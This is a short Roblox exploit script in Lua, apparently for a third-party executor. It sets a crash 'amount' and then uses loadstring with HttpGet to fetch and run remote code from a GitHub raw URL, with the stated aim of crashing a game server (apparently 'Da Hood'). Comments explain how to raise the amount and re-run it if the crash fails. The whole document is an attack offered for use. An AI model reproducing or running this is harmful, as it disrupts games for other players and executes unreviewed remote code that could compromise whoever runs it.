getgenv().Active = true --Toggle true or false
getgenv().CrashAmmount = 500 --The more you add the better
--[[ Theres a chance that the crash fails, if that happends just re execute and
     add more to CrashAmmount
      Requirements:
      Any PC, 5 minutes, account has to be in a group (it doesnt matter the group)
]]

loadstring(game:HttpGet('https://raw.githubusercontent.com/GS21Official/Seller-Tools/main/GS21%20Dh%20Crash'))()